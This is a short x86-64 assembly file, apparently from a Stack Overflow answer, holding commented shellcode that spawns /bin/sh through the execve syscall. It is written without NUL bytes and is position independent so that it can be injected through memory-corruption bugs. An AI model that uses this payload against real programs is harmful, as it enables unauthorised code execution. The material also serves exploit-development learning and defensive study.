# https://stackoverflow.com/questions/64415910/shellcode-illegal-instruction
# This shell code is designed to avoid any NUL(0x00) byte characters being generated
# and is coded to be position independent.

.section .text
.globl _start
_start:
    jmp overdata                 # Mix code and DATA in same segment

# Generate all the strings without a NUL(0) byte. We will replace the 0xff
# with 0x00 in the code
name:.ascii "/bin/sh"            # Program to run
name_nul: .byte 0xff             # This 0xff will be replaced by 0x00 in the code

overdata:
    xor  %eax, %eax              # RAX = 0

    # All references to the data before our code will use a negative offset from RIP
    # and use a 4 byte displacement. This avoids producing unwanted NUL(0) characters
    # in the code. We use RIP relative addressing so the code will be position
    # independent once loaded in memory.

    # Zero terminate each of the strings
    mov  %al, name_nul(%rip)

    lea  name(%rip), %rdi        # RDI = pointer to program name string

    push %rax                    # NULL terminate the program argument array
    push %rdi                    # Push address of the program name on stack as 1st arg
    mov  %rsp, %rsi              # RSI = Pointer to the program argument array

    xor  %edx, %edx              # RDX = 0 = NULL envp parameter

    mov $59, %al                 # RAX = execve system call number

    syscall
